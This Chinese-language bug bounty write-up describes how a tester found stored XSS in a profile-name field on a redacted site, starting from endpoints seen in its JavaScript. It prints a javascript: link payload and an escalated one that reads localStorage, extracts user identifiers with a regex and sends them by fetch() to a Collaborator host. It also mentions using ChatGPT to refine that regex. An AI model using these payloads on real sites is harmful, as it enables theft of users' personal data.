声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。
## 前言

一次渗透测试中，白帽小哥发现了 2 处 CSRF 漏洞，但不幸的是 CSRF 不在赏金范围内。

于是小哥开始尝试搜索JS文件，白帽小哥通常的做法是利用Chrome的开发者工具搜索特定的关键字或API端点，比如：

```
path:
url:
to:
api
/v1/
```

## 发现过程

并且作为额外的步骤，白帽小哥通常会搜索目标的任意目录或端点，比如 https://subdomain.redacted.com/en/account-profile 站点，就会搜索account-profile端点，查看它在代码中是如何被使用的。

很快白帽小哥就在 JS 代码中发现了一堆端点：

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkO1IIR9dLZrichHOo9SqaxTIoCI1RcwRoUUzeGyicLZfOkIGuEubh6radcFicBpYaliaQRPKAdEeOHqA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

发现端点

小哥尝试找到的每个端点，其中一个端点是(/platform/apps/lighthouse-homepage)，当访问该端点时，白帽小哥发现到一个HTML Payload 被成功渲染：

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkO1IIR9dLZrichHOo9SqaxTPz5oCAIBxic2pdCQhpweN0HKLVzmVfibSXc3fUrtoJCzp2SvPrx8kuibA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

Payload 被成功渲染

返回端点并尝试重新修改名称，然后再次查看Payload是否已更改，从而确认Payload 是否可以在该页面中实现注入。

尝试了多个 XSS Payloads，但真正有效的只有`Href`:

`test<a href="javascript:alert(1)">clickme</a>`

由于 Cookies 中有 HTTPOnly 标识，因此不会产生太大影响，至少会被定为 P3 级漏洞。

白帽小哥不想就这样提交漏洞报告，因此他需要尝试将漏洞升级到更具影响力。

小哥开始查看 LocalStorage ，LocalStorage 有很多条目，特别是其中一个条目包含大量有关该帐户的 PII 信息（电子邮件地址、名字和姓氏、用户 ID、用户权限等）。

小哥尝试再次重写Payload，经过反复试验，并与ChatGPT 讨论正则表达式，最终 Payload 如下：

```
<a href="javascript:var match=JSON.stringify(localStorage).match(/ZNavIdentity\.userId=[^&]+&currEntityId=[^&]+/);if(match)fetch('https://#collab.oastify/?cookie='+encodeURIComponent(match[0]))">ttt</a>
```

Payload 会将 LocalStorage 中的数据转换为字符串，然后使用正则表达式搜索特定键，然后对其值进行编码，最后将其发送到collaborator。

由于 LocalStorage 数据太大，无法全部发送，因此只能尝试使用正则表达式来获取包含敏感信息的密钥。

漏洞报告很快得到了回应，小哥也顺利获得了赏金奖励。

![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkO1IIR9dLZrichHOo9SqaxTeibl4ozRZEfiaOYow7lJAflxxRy1r4EBgRkVGpN6GL6MiawTrxeDSJurQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2)

